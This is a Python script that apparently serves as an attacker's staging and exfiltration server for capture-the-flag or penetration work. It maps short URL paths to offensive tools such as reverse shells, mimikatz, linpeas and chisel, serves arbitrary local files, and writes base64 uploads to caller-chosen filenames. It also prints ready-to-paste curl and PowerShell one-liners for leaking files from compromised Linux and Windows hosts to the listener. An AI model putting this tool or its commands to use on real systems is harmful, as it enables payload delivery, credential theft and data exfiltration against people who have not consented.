#!/usr/bin/env python3
import http.server
from sys import argv
from os.path import exists
from base64 import b64decode
from urllib.parse import urlparse, parse_qs

file_map = {
    '/k':    './ctfKey',
    '/ra':    './RunasCs.exe',
    '/kp':   './ctfKey.pub',
    '/rs':   './reverse-shell.php',
    '/lp':   './linpeas.sh',
    '/wp':   './winpeas.exe',
    '/rb':   './revBash.sh',
    '/cs':   './chisel_1.8.1_linux_amd64',
    '/csw':  './chisel_1.8.1_windows_amd64.exe',
    '/rbd':  './revBashDec.sh',
    '/psy':  './pspy64',
    '/rb64': './rb64',
    '/rps1': './revSh.ps1',
    '/mimi': './mimikatz.exe'
}

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        if 'html' in self.path:
            self.send_header('Content-Type', 'text/html')
        else:
            self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        if self.path in file_map.keys():
            with open(file_map[self.path], 'rb') as f:
                self.wfile.write(f.read())
        else:
            f1le = self.path[1:] if len(self.path) != 1 else False
            if f1le and exists(f1le):
                with open(f1le, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                print('nope')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_params = parse_qs(post_data.decode())
        try:
            res = post_params['c'][0].replace(' ', '').strip()
            while len(res) % 4 != 0: res += '='

            if any(c in res for c in "-_."):
                res = b64decode(res.replace('-', '+').replace('_', '/').replace('.', '='))
            else: res = b64decode(res)

            with open(post_params['n'][0], 'wb') as f:
                f.write(res)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response = "ok"
            self.wfile.write(response.encode())
        except Exception as e:
            print(f'err: {e}')

for i in file_map.keys(): print(i, file_map[i])
print('-'*21)
print(f'leak files with:\n=> curl {argv[2]}:{argv[1]} -d "c=$(base64 -w0 <file>|tr "+/=" "-_.")&n=<fname>"\n')
print('windows b64encode:\n=> certutil -encode InFile OutFile\n=> $f=$(findstr /v /c:- "OutFile")\n')
print(f'leak files with:\n=> iwr -Method Post {argv[2]}:{argv[1]} -Body "c=$f&n=<fname>"')
print('-'*21)
httpd = http.server.HTTPServer(('0.0.0.0', int(argv[1])), RequestHandler)
httpd.serve_forever()
